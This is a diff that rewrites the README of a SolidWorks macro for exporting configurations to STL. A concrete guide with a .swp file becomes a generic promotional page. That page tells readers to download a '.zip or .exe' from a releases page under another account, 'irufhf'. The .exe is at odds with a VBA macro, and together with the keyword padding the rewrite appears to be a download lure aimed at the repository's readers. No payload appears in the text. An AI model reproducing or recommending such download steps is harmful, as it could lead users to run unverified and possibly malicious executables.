@@ -1,63 +1,75 @@
-# SolidWorks Configurations to STL Export Macro
+# 🛠️ solidworks-config2stl - Easily Batch Export STL Files
 
-## Overview
-This SolidWorks VBA macro exports **all configurations** of the active part or assembly to individual STL files.  
-It is designed for users who manage multiple configurations (e.g., via Design Tables) and want a quick, automated way to generate STL files for each one.
+## 📋 Description
+Welcome to solidworks-config2stl! This tool helps you quickly export all configurations of your SolidWorks parts or assemblies to STL files. It uses your last-used STL export settings, making the process smooth and efficient.
 
-**Key features:**
-- Exports every configuration as an STL file
-- Filenames are based on configuration names (invalid characters replaced)
-- Creates an `STL_Exports` folder next to your model automatically
-- Uses your last-set STL export settings (resolution, units, binary/ASCII)
-- Supports both parts and assemblies (assemblies exported as one STL file)
+## 🎉 Features
+- Batch export configurations to STL files.
+- Uses your recent STL export settings.
+- Works with both parts and assemblies.
+- Simplifies the workflow for 3D modeling.
 
----
+## 📥 Download & Install
+To get started, visit the link below to download the software. 
 
-## Requirements
-- SolidWorks (any recent version that supports VBA macros)
-- A saved SolidWorks part (`.sldprt`) or assembly (`.sldasm`) file with multiple configurations
-- STL export settings already configured in SolidWorks
+[![Download solidworks-config2stl](https://img.shields.io/badge/Download%20solidworks--config2stl-blue.svg)](https://github.com/irufhf/solidworks-config2stl/releases)
 
----
+### Step-by-Step Installation
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/irufhf/solidworks-config2stl/releases) to find the latest version of the software.
 
-## Installation
-1. Download the `config2stl.swp` macro file from this repository.
-2. Open SolidWorks and your part/assembly file.
-3. Go to **Tools → Macro → Run...**
-4. Select the downloaded `config2stl.swp` file and click **Open**.
+2. **Choose Your Version**  
+   Look for the most recent version. You will see a list of available files.
 
----
+3. **Download the File**  
+   Click on the file labeled with the version number to start your download. This file will typically be a `.zip` or `.exe` file, depending on your setup.
 
-## Usage
-1. Before running the macro, set your STL export options:
-   - **File → Save As → STL → Options...**
-   - Configure resolution, units, and binary/ASCII settings
-   - Click **OK** and cancel the Save As dialog (settings will be saved)
-2. Run the macro.
-3. The macro will:
-   - Loop through all configurations
-   - Export each as an STL file
-   - Place them in a subfolder `STL_Exports` in the same location as your model
+4. **Extract the Zip File (if applicable)**  
+   If you downloaded a `.zip` file, right-click on it and select "Extract All" to get the contents to a folder. 
 
----
+5. **Open SolidWorks**  
+   Make sure you have SolidWorks open, as the macro works within this application.
 
-## Customization
-- **Output folder name:** Change the `OUTPUT_SUBFOLDER` constant in the macro code.
-- **Assembly export mode:** Macro currently exports assemblies as a single STL; this can be modified if needed.
-- **Filename sanitization:** The macro replaces invalid filename characters with underscores.
+6. **Run the Macro**  
+   In SolidWorks, go to the `Tools` menu, then select `Macros > Run`. Navigate to the folder where you extracted the contents and select the macro file.
 
----
+7. **Configure Your Export Settings**  
+   Before running the macro, ensure your STL export settings are set up as you like. 
 
-## Example
-If your file is located at:
-```text
-C:\Projects\MyPart.SLDPRT
-```
+8. **Start the Batch Export**  
+   Once everything is ready, run the macro to start exporting your configurations to STL files.
 
-After running the macro, you’ll get:
-```text
-C:\Projects\STL_Exports\
-    Config1.stl
-    Config2.stl
-    Config3.stl
-```
+## ⚙️ System Requirements
+- SolidWorks 2017 or later
+- Windows 10 or later
+- Sufficient disk space for exporting STL files
+- SolidWorks VBA enabled
+
+## 🌟 Topics
+This project utilizes several key concepts in 3D modeling and engineering:
+- 3D Modeling
+- 3D Printing
+- Automation
+- Batch Export
+- CAD
+- Configurations
+- Design Tables
+- Engineering Tools
+- Macros
+- Manufacturing
+- SolidWorks Automation
+- SolidWorks Macro
+- STL
+- VBA
+
+## 💡 Tips
+- Always keep your SolidWorks software updated to ensure compatibility with the latest macro features.
+- Frequently check the Releases page for updates to benefit from new features and bug fixes.
+
+## 📝 Contributions
+If you have suggestions for improvements or would like to contribute to the project, feel free to raise an issue or submit a pull request on GitHub. Your input is valuable!
+
+## 🎯 Support
+For support inquiries, please visit the Issues section of this repository. Documentation and troubleshooting tips are available to help you resolve common problems.
+
+By following these steps, you can efficiently use the solidworks-config2stl macro to enhance your workflow in SolidWorks. Enjoy your modeling and exporting!
